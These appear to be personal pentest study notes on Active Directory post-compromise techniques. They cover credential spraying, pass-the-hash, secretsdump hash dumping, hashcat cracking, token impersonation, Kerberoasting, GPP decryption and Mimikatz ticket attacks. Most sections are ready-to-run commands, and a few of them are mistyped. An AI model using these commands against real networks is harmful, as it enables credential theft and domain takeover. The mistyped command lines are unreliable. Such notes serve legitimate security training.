## Post compromise exploitation
Must have some creds or a shell.
### Pass the password
Using crackmapexec, pass passwd (credentials found) to all pcs on a subnet/ip-range and see where we can pwn.
```bash
crackmapexec smb 172.25.64.0/20 -u solaire -d SOULS.local -p Password1
```
or
```bash
crackmapexec smb 172.25.64.0/20 -u solaire -p Password1 --local-auth
```
### Dumping hashes
If you have credentials (of user with admin rights) for 1 or more machines (same user can have access to more than 1), use secretsdump.py (part of impacket) to dump hashes:
```bash
ecretsdump.py <DOMAIN>/<USER>@<COMPUTER-IP>
```
### Craching Hashes with hashcat
- Secretsdump.py gives hashes of NTLM type (previously we got NTLMv2).
- We can pass around NTLM but not NTLMv2.
- Do: `hashcat --help | grep <hash-type>` to get the code
- `hashcat -m <code> <txt files with hash> SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force`

### Pass the hash
```bash
crackmapexec smb 172.25.64.0/20 -u solaire -H <hash> --local-auth
```
Note: if it says `pwned` then surely the hash/passwd worked. But if its green there is a possibility it didnt work (false +ve).<br>
* If you find most pcs pwned or green in crackmapexec, you can use psexec to get a shell:
```bash
psexec.py "user name":@<ip> -hases LMHASH:NTHASH
```

### Token impersonation
- If you have creds/hash, get meterpreter shell via psexec (msfconsole).
- In meterpreter, `load incognito` to load incognito tool.
- Type: `list_tokens -u`.
- See which tokens available (dommain\\admin will be most severe)
- Type `impersonate_token domain\\administrator` to impersonate user. 
- Now domain admin shell. lesgo.
- Can also find user tokens, whenever users log in (delegate token) and get shell as that user. 

### Kerberoasting
https://medium.com/@Shorty420/kerberoasting-9108477279cc<br>
Kerberos gist:
- When a user logs on to Active Directory, the user authenticates to the Domain Controller (DC) using the user’s password which of course the DC knows.
- The DC sends the user a Ticket Granting Ticket (TGT) Kerberos ticket. The TGT is presented to any DC to prove authentication for Kerberos service tickets.
- The user opens up Skype which causes the user’s workstation to lookup the Service Principal Name (SPN) for the user’s Exchange server.
- Once the SPN is identified, the computer communicates with a DC again and presents the user’s TGT as well as the SPN for the resource to which the user needs to communicate.
- The DC replies with the Ticket Granting Service (TGS) Kerberos service ticket.
- The user’s workstation presents the TGS to the Exchange server for access.
- Skype connects successfully.
Keberoasting Steps:
1. Get SPN, dump TGS(kbr5tgs hash:
```bash
GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user:password>
```
2. Crack the hash:
```bash
hashcat -m 13100 <hash_file> <rockyou wordlist>
```

### GPP
https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/<br>
```
gpp-decrypt <hash>
```
You get password and username of a low level user, can use psexec, kerberoasting etc to privesc.

### Mimikatz
https://github.com/gentilkiwi/mimikatz/wiki<br>
https://harshdushyants.medium.com/mimikatz-b3c5fd9f97b9<br>
- Golden ticket attack (a 'golde' kerberos ticket to access anything) https://pentestlab.blog/2018/04/09/golden-ticket/
- Golden ticket is `persistence`.
- **Silver ticket** even better (stealtheir) ... look into it.
